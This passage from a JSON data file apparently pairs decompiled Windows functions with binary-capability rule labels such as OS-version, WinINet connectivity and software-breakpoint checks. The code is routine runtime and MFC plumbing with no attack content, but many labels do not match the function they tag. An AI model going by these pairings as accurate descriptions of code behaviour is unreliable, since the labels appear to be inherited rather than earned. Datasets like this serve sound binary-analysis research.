        "decompiled_code": "\nvoid fcn.00402380(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *arg_8h;\n    \n    if (param_1 == NULL) {\n        fcn.00401280(0x80070057);\n    }\n    arg_8h = param_1;\n    if (param_1 < 0) {\n        fcn.00401280(0x80070057);\n        arg_8h = extraout_ECX;\n    }\n    if (param_2 == 0) {\n        fcn.00401280(0x80070057);\n        arg_8h = extraout_ECX_00;\n    }\n    iVar1 = *param_1;\n    if (iVar1 == param_2) goto code_r0x004023f8;\n    if (param_2 < arg_8h) {\n        iVar1 = fcn.0045ee31(iVar1, arg_8h, 1);\n        if (iVar1 != 0) goto code_r0x00402409;\n        iVar1 = fcn.00401280(0x8007000e);\n    }\n    fcn.0045e756(iVar1);\n    do {\n        *param_1 = param_2;\n        while( true ) {\n            if (*param_1 != 0) {\n                return;\n            }\n            fcn.00401280(0x8007000e);\n            arg_8h = extraout_ECX_01;\ncode_r0x004023f8:\n            if (arg_8h <= param_2) break;\n            iVar1 = fcn.0045e902(arg_8h, 1);\ncode_r0x00402409:\n            *param_1 = iVar1;\n        }\n    } while( true );\n}\n",
        "token_count": 436
    },
    "0040fa10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040fa10(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            fcn.0045f3a0(param_1 + 4, 0x10, arg_10h, param_3);\n        }\n        fcn.004115a4(arg_10h);\n    }\n    *(param_1 + 0x14) = param_3;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4 + param_3) = 0;\n    return;\n}\n",
        "token_count": 192
    },
    "0040fb00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040fb00(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBP;\n    int32_t **ppiVar6;\n    \n    iVar3 = *param_1;\n    if (param_2 < *(iVar3 + -0xc)) {\n        param_2 = *(iVar3 + -0xc);\n    }\n    if (1 < *(iVar3 + -4)) {\n        iVar3 = *param_1;\n        iVar2 = *(iVar3 + -0xc);\n        ppiVar6 = iVar3 + -0x10;\n        puVar4 = (**(**ppiVar6 + 0x10))();\n        iVar5 = (***puVar4)(param_2, 1);\n        if (iVar5 == 0) {\n            fcn.0040fe20();\n        }\n        if (iVar2 < param_2) {\n            param_2 = iVar2;\n        }\n        fcn.0045f3a0(iVar5 + 0x10, param_2 + 1, iVar3, param_2 + 1);\n        *(iVar5 + 4) = iVar2;\n        piVar1 = iVar3 + -4;\n        LOCK();\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar3 == 1 || iVar3 + -1 < 0) {\n            (**(**ppiVar6 + 4))(ppiVar6);\n        }\n        *unaff_EBP = iVar5 + 0x10;\n        return;\n    }\n    iVar3 = *(iVar3 + -8);\n    if (param_2 <= iVar3) {\n        return;\n    }\n    if (iVar3 < 0x401) {\n        iVar3 = iVar3 * 2;\n    }\n    else {\n        iVar3 = iVar3 + 0x400;\n    }\n    if (iVar3 < param_2) {\n        iVar3 = param_2;\n    }\n    iVar2 = *param_1;\n    if ((*(iVar2 + -8) < iVar3) && (0 < iVar3)) {\n        iVar3 = (**(**(iVar2 + -0x10) + 8))(iVar2 + -0x10, iVar3, 1);\n        if (iVar3 != 0) goto code_r0x0040fede;\n    }\n    iVar3 = fcn.0040fe20();\ncode_r0x0040fede:\n    *param_1 = iVar3 + 0x10;\n    return;\n}\n",
        "token_count": 602
    },
    "0040ff00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.0040ff00(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h;\n    int32_t arg_10h;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    code *apcStack44 [3];\n    uint var_28h;\n    uint uStack28;\n    int32_t iStack24;\n    uint32_t *puStack20;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x48f150;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x4b8030 ^ &var_ch_3;\n    puStack20 = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(param_1 + 0x18);\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            uVar5 = uVar3 + uVar1;\n        }\n    }\n    var_10h_2 = 0;\n    iStack24 = param_1;\n    if ((uVar5 + 1 != 0) && (0xffffffff / (uVar5 + 1) == 0)) {\n        uStack28 = 0;\n        fcn.0045f00a();\n        apcStack44[0] = vtable.std::bad_alloc.0;\n        fcn.0046230a(apcStack44, 0x4b0fb0);\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        puStack20 = &stack0xffffffb8;\n        fcn.004100d0(var_4h + 1);\n        return 0x40ffde;\n    }\n    puStack20 = &uStack60;\n    arg_8h = fcn.00411579();\n    var_10h_2 = 0xffffffff;\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            arg_10h = param_1 + 4;\n        }\n        else {\n            arg_10h = *(param_1 + 4);\n        }\n        fcn.0045f3a0(arg_8h, uVar5 + 1, arg_10h, param_3);\n    }\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.004115a4();\n    }\n    puVar2 = param_1 + 4;\n    *puVar2 = 0;\n    *puVar2 = arg_8h;\n    *(param_1 + 0x18) = uVar5;\n    *(param_1 + 0x14) = param_3;\n    if (0xf < uVar5) {\n        puVar2 = arg_8h;\n    }\n    *(puVar2 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return puVar2;\n}\n",
        "token_count": 876
    },
    "004100d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004100d0(uint *param_1)\n\n{\n    code *pcVar1;\n    uint *apuStack16 [4];\n    \n    if (param_1 == NULL) {\n        apuStack16[0] = NULL;\n    }\n    else {\n        apuStack16[0] = param_1;\n        if (0xffffffff / ZEXT48(param_1) == 0) {\n            apuStack16[0] = &param_1;\n            param_1 = NULL;\n            fcn.0045f00a();\n            apuStack16[0] = vtable.std::bad_alloc.0;\n            fcn.0046230a(apuStack16, 0x4b0fb0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    fcn.00411579();\n    return;\n}\n",
        "token_count": 197
    },
    "00411410": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411410(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x48ef5b;\n    piStack20 = *in_FS_OFFSET;\n    uVar3 = *0x4b8030 ^ &stack0xffffff68;\n    *in_FS_OFFSET = &piStack20;\n    iVar1 = *(param_1 + 0x54);\n    fcn.00401f20(uVar3);\n    uStack12 = 0;\n    uVar2 = *(iVar1 + 0x74);\n    iVar4 = fcn.00412928();\n    if (iVar4 == 1) {\n        *(iVar1 + 0x74) = uVar2;\n        fcn.004286f6(0, 0, 0);\n    }\n    fcn.00412102();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 273
    },
    "0045e756": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0045e756(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b03b0, 0xc);\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        if (*0x4bd43c == 3) {\n            fcn.00465cd3(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.00465def(iVar1);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.00465e1a(arg_8h_00, iVar1);\n            }\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0045e7ac();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0045e7de;\n            iVar1 = *(unaff_EBP + 8);\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4bba7c, 0, iVar1);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00462f86();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00462f4b(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\ncode_r0x0045e7de:\n    fcn.00463841();\n    return;\n}\n",
        "token_count": 437
    },
    "00411d27": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411d27(int32_t *param_1)\n\n{\n    if (0 < param_1[1]) {\n        (**(*param_1 + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 50
    },
    "00412102": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00412102(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[8] != NULL) {\n        fcn.00418804();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00418ff3();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 159
    },
    "004126f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004126f7(uint *param_1, int32_t param_2)\n\n{\n    uint *extraout_ECX;\n    \n    if (param_2 == 0) {\n        fcn.00401280(0x80004005);\n        param_1 = extraout_ECX;\n    }\n    fcn.00462a83(*param_1, param_2);\n    return;\n}\n",
        "token_count": 93
    },
    "00412ba5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00412ba5(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint unaff_EDI;\n    \n    *(param_1 + 0x58) = param_2;\n    if (((param_2 & 0xffff0000) == 0) && (*(param_1 + 0x54) == 0)) {\n        *(param_1 + 0x54) = param_2 & 0xffff;\n    }\n    iVar1 = fcn.0043026e();\n    uVar3 = *(iVar1 + 0xc);\n    uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar3, param_2, 5);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar3, uVar2);\n    uVar3 = fcn.00412b6c(uVar2, unaff_EDI, uVar3);\n    (*_sym.imp.KERNEL32.dll_FreeResource)(uVar2);\n    return uVar3;\n}\n",
        "token_count": 251
    },
    "00412d0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00412d0c(int16_t *arg_8h, uint arg_ch, int16_t *arg_10h)\n\n{\n    if (arg_10h == NULL) {\n        arg_10h = fcn.00411e42();\n    }\n    if ((arg_8h == NULL) && (arg_ch != 0)) {\n        *(arg_10h + 2) = 0;\n        *(arg_10h + 6) = 0xffffffff;\n        *(arg_10h + 8) = 0xffffffff;\n        *arg_10h = arg_ch;\n        *(arg_10h + 4) = 1;\n        arg_8h = arg_10h;\n    }\n    return arg_8h;\n}\n",
        "token_count": 173
    },
    "00412e1a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412e1a(int32_t lpString, uint rclsid, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint hKey;\n    uint lplpsz;\n    \n    pcVar1 = _sym.imp.ole32.dll_CoTreatAsClass;\n    iVar2 = (*_sym.imp.ole32.dll_CoTreatAsClass)(rclsid, arg_10h);\n    if ((iVar2 != 0) && (lpString != 0)) {\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &hKey);\n        lplpsz = 0;\n        (*_sym.imp.ole32.dll_StringFromCLSID)(rclsid, &lplpsz);\n        uVar3 = fcn.00431875(lplpsz);\n        uVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueA)(hKey, uVar3, 1, lpString, uVar4);\n        (*_sym.imp.ole32.dll_CoTaskMemFree)(uVar3);\n        iVar2 = (*pcVar1)(rclsid, arg_10h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    }\n    return iVar2;\n}\n",
        "token_count": 323
    },
    "00412ea5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00412ea5(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    piVar1 = arg_8h;\n    if (arg_8h != NULL) {\n        iVar2 = (**(*arg_8h + 0x58))(arg_8h, &var_8h);\n        if ((iVar2 != 0) || (var_8h != 1)) {\n            (**(*piVar1 + 4))(piVar1);\n            return piVar1;\n        }\n        arg_8h = NULL;\n        iVar2 = (**(*piVar1 + 0x30))(piVar1, 1, &arg_8h);\n        if (iVar2 == 0) {\n            var_4h = NULL;\n            (**(*arg_8h + 0xc))(arg_8h, 1, &var_4h, 0);\n            fcn.00431b26(&arg_8h);\n            return var_4h;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 263
    },
    "00412f0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412f0c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    uVar2 = 0;\n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        var_8h = fcn.00412ea5(arg_8h);\n        if (var_8h != NULL) {\n            iVar1 = (**(*var_8h + 0x58))(var_8h, &var_ch);\n            if ((iVar1 == 0) && (var_ch == 2)) {\n                var_4h = 0;\n                iVar1 = (*_sym.imp.ole32.dll_CreateBindCtx)(0, &var_4h);\n                if (iVar1 == 0) {\n                    arg_8h = 0;\n                    iVar1 = (**(*var_8h + 0x50))(var_8h, var_4h, 0, &arg_8h);\n                    if ((iVar1 == 0) && (arg_8h != 0)) {\n                        uVar2 = fcn.00462a96(arg_8h);\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(arg_8h);\n                    }\n                    fcn.00431b26(&var_4h);\n                }\n            }\n            fcn.00431b26(&var_8h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 353
    },
    "0041336c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041336c(int32_t arg_8h, int32_t noname_1, int32_t noname_2, int32_t noname_3, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h, int32_t arg_2ch, int16_t *arg_30h, int16_t *arg_34h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint unaff_ESI;\n    uint var_24h;\n    uint var_20h;\n    uint hMem;\n    int16_t *var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_18h = arg_34h;\n    if (arg_30h == NULL) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_30h);\n        iVar2 = iVar2 + 1;\n    }\n    if ((arg_34h == NULL) || (*arg_34h == 0)) {\n        var_18h = arg_30h;\n        iVar3 = iVar2;\n    }\n    else {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_34h);\n        iVar3 = iVar3 + 1;\n    }\n    iVar1 = (iVar3 + iVar2) * 2 + 0x34;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x2042, iVar1);\n    if (iVar4 != 0) {\n        piVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n        if (arg_30h == NULL) {\n            piVar5[0xb] = 0;\n        }\n        else {\n            piVar5[0xb] = 0x34;\n            fcn.004012c0(piVar5 + 0xd, iVar2, arg_30h);\n        }\n        if (var_18h == NULL) {\n            piVar5[0xc] = 0;\n        }\n        else {\n            iVar2 = iVar2 * 2 + 0x34;\n            piVar5[0xc] = iVar2;\n            fcn.004012c0(iVar2 + piVar5, iVar3, var_18h);\n        }\n        *piVar5 = iVar1;\n        piVar5[5] = arg_18h;\n        piVar5[1] = arg_8h;\n        piVar5[6] = arg_1ch;\n        piVar5[2] = noname_1;\n        piVar5[7] = arg_20h;\n        piVar5[8] = arg_24h;\n        piVar5[3] = noname_2;\n        piVar5[9] = arg_28h;\n        piVar5[4] = noname_3;\n        piVar5[10] = arg_2ch;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n    }\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 738
    },
    "0041386b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041386b(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (param_2 < *(iVar1 + -0xc)) {\n        param_2 = *(iVar1 + -0xc);\n    }\n    if (*(iVar1 + -4) < 2) {\n        iVar1 = *(iVar1 + -8);\n        if (iVar1 < param_2) {\n            if (iVar1 < 0x401) {\n                iVar1 = iVar1 * 2;\n            }\n            else {\n                iVar1 = iVar1 + 0x400;\n            }\n            if (iVar1 < param_2) {\n                iVar1 = param_2;\n            }\n            fcn.00413837(iVar1);\n        }\n    }\n    else {\n        fcn.004137cf(param_2);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "004138da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004138da(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    uint32_t uVar2;\n    \n    if (arg_ch == 0) {\n        fcn.0041372f();\n    }\n    else {\n        if (arg_8h == 0) {\n            fcn.00401280(0x80070057);\n        }\n        uVar1 = *(*in_ECX + -0xc);\n        uVar2 = arg_8h - *in_ECX;\n        arg_8h_00 = fcn.0040f8a0(arg_ch);\n        if (uVar1 < uVar2) {\n            fcn.0045f3a0(arg_8h_00, arg_ch, arg_8h, arg_ch);\n        }\n        else {\n            fcn.0045ef9e(arg_8h_00, arg_ch, arg_8h_00 + uVar2, arg_ch);\n        }\n        fcn.0040f8d0(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "00413fe1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00413fe1(int32_t param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY304;\n    int32_t iStackY300;\n    int32_t in_stack_fffffed8;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint uVar10;\n    int32_t in_stack_fffffeec;\n    uint uStack264;\n    uint uStack256;\n    uint in_stack_ffffff04;\n    \n    uStack264 = 0x2c;\n    fcn.004627af();\n    iStackY300 = param_2;\n    bVar3 = false;\n    iVar4 = (*_sym.imp.USER32.dll_GetMenuItemCount)(param_2);\n    iVar9 = 0;\n    iVar8 = 0;\n    if (0 < iVar4) {\n        do {\n            in_stack_fffffeec = iStackY300;\n            (*_sym.imp.USER32.dll_GetSubMenu)(iStackY300, iVar8);\n            uVar10 = 0x400;\n            iVar6 = 0x41406f;\n            iVar9 = iStackY300;\n            uVar5 = (*_sym.imp.USER32.dll_GetMenuState)(iStackY300, iVar8, 0x400);\n            if ((iVar6 == 0) && ((uVar5 & 0x800) != 0)) {\n                *(param_3 + param_4 * 4) = iVar8;\n                param_4 = param_4 + 2;\n                iVar8 = iVar9;\n                iVar9 = 0;\n            }\n            else {\n                iStackY304 = 0;\n                if ((param_5 != 0) && ((param_4 == 5 && (*(param_3 + 0x14) == 1)))) {\n                    iStackY304 = (*_sym.imp.USER32.dll_GetSubMenu)(param_1, uVar10);\n                }\n                in_stack_fffffeec = 0x100;\n                iVar7 = 0x4140e6;\n                iVar8 = iStackY300;\n                iVar6 = (*_sym.imp.USER32.dll_GetMenuStringA)(iStackY300, iVar9, &stack0xfffffef8, 0x100, 0x400);\n                if (iVar7 == 0) {\n                    if (0 < iVar6) {\n                        in_stack_fffffeec = (*_sym.imp.USER32.dll_GetMenuItemID)(iStackY300, iVar8, &stack0xfffffef8);\n                        uVar5 = uVar5 | 0x400;\ncode_r0x0041419c:\n                        iVar8 = param_1;\n                        (*_sym.imp.USER32.dll_InsertMenuA)();\n                        iVar9 = uVar5 + 1;\n                    }\n                }\n                else if (iStackY304 == 0) {\n                    in_stack_fffffeec = 0x41416e;\n                    iVar6 = (*_sym.imp.USER32.dll_GetMenuItemCount)(iVar7);\n                    if (iVar6 != 0) {\n                        uVar5 = uVar5 & 0xff | 0x410;\n                        in_stack_fffffeec = iVar7;\n                        goto code_r0x0041419c;\n                    }\n                }\n                else {\n                    iVar9 = fcn.0043026e();\n                    uVar10 = *(iVar9 + 0x10);\n                    in_stack_fffffeec = 0x414106;\n                    fcn.00413f9d(uVar10);\n                    if (*(in_stack_fffffed8 + -0xc) != 0) {\n                        in_stack_fffffeec = 0x20;\n                        fcn.004138b2(0x20, uVar10, 0);\n                    }\n                    fcn.00413a5f(&stack0xfffffef8);\n                    iStackY300 = 0x41413b;\n                    (*_sym.imp.USER32.dll_AppendMenuA)(iStackY304, 0x10);\n                    puVar2 = param_3 + param_4 * 4;\n                    *puVar2 = 0;\n                    piVar1 = puVar2 + -1;\n                    *piVar1 = *piVar1 + 1;\n                    bVar3 = true;\n                    iVar9 = in_stack_fffffed8;\n                    fcn.00402740(0xffffffff);\n                    in_stack_fffffed8 = iStackY304;\n                    iVar8 = iVar7;\n                }\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < iVar4);\n        if (bVar3) goto code_r0x004141cf;\n    }\n    *(param_3 + param_4 * 4) = iVar9;\ncode_r0x004141cf:\n    *in_FS_OFFSET = in_stack_fffffeec;\n    uStack256 = 0x4141ed;\n    fcn.0045e747(in_stack_ffffff04);\n    return;\n}\n",
        "token_count": 1158
    },
    "004141f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: lpString\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: ppbc\n\nvoid __cdecl fcn.004141f7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *arg_8h_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    int32_t unaff_EBP;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint ppbc;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint lpString;\n    uint var_24h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00462818(0x48);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x2c) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x50) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x24) = 0;\n    *(unaff_EBP + -0x38) = 0;\n    iVar2 = fcn.00431b02(arg_8h_00, 0x49fa88);\n    *(unaff_EBP + -0x48) = iVar2;\n    *(unaff_EBP + -0x3c) = iVar2 != 